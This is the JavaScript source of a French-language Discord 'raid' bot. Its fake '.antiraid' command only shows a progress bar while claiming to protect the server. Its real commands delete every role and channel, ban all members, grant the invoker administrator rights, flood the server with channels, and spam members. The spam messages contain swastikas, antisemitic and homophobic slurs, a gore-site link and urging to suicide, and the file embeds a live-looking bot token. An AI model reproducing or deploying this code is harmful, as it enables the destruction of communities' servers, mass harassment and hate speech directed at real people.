const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "NzUxMTU1ODM2MTcyMzY5OTUw.X1E-Yw.TUfAQskOE2vybyJcTNjO_ew1ktE";
var prefix = ".";
var mention = "126connectés"

var fucked = false;
 
bot.on('ready',() => {
    //invit link
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
 
bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if(msg.content === ".antiraid"){
    msg.delete()
    msg.channel.send('**Activation du mode Anti-Raid ⚠**').then(async msg => {
      setTimeout(() => {
        msg.edit('░░░░░░░░░░ 0%');
      }, 1000);
      setTimeout(() => {
        msg.edit('▓▓░░░░░░░░ 20%');
      }, 1500);
      setTimeout(() => {
        msg.edit('▓▓▓▓░░░░░░ 40%');
      }, 2000);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓░░░░ 60%');
      }, 2500);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓▓▓░░ 80%');
      }, 3000);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
      }, 3500);
      setTimeout(() => {
msg.edit(`Votre serveur est protégé contre les attaques !`);
      }, 3500);
    });
    };
  //#endregion
 if (msg.content === ".des") {
          if(msg.channel.type === "dm") return;
          msg.guild.roles.forEach(role => role.delete());
          if (msg.deletable) msg.delete();
          let interval = setInterval(function () {
            if(msg.guild.roles.size < 99)msg.guild.createRole({name: '$hacked$', color:'RANDOM'}).catch(error => {})
            if(msg.member.roles.size < 99 ) msg.member.addRoles(msg.guild.roles.findAll("name", "$hacked$"))
            })
        }
        //RENAME TOUT LE MONDE EN DESSOUS DU BOT
        if(msg.content === ".des"){
          msg.delete();
          msg.guild.members.map(async (member, id) =>{
            member.setNickname("sale juif");
          });
        } 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.a') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone  @here 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 LA DLA EST SUP2RIEUR A TOI ET VIEN DE D2TRUIRE TON SERVEUR GROSSE MERDE , U GOT DESTROYED BIG SHIThttps://cdn.discordapp.com/attachments/604686631651377152/604691251895468042/epil.gif 卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍");
     }, 500);
  }
            if (msg.content === '.des') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.owner.user.username+" **s'est fait bz son server de fion** ! https://cdn.discordapp.com/attachments/604686631651377152/604691251895468042/epil.gif https://www.youtube.com/channel/UCvOMrnapGUxn8LgJSgi9FqQ ").catch(error => {}) }, 450)})
       }

if(msg.content === '.del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon("https://cdn.discordapp.com/attachments/681276446122967060/748121963695964170/image0.png").catch(e => {});
      msg.guild.setName('gros pd').catch(e => {});
 
      for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('pd', 'voice').catch(e => {});
        msg.guild.createChannel('hax hax hax', 'text').catch(e => {});
      }
      fucked = true;
            }

if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "la steet") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "membre",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.on("message", msg => {
        if(msg.content.startsWith(".des")){ 
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone  @here 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 **LA SKA VOUS A BIEN BAISER VOS MÈRES! SUICIDEZ VOUS MTN BANDES DE GROS GAY** https://bestgore.com/ https://cdn.discordapp.com/attachments/604686631651377152/604691251895468042/epil.gif 卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍卍卍卍卍卍卍卍 卍卍卍卍卍卍卍卍')
              }, 2500);
            });
          }
        });

bot.login("NzUxMTU1ODM2MTcyMzY5OTUw.X1E-Yw.TUfAQskOE2vybyJcTNjO_ew1ktE")
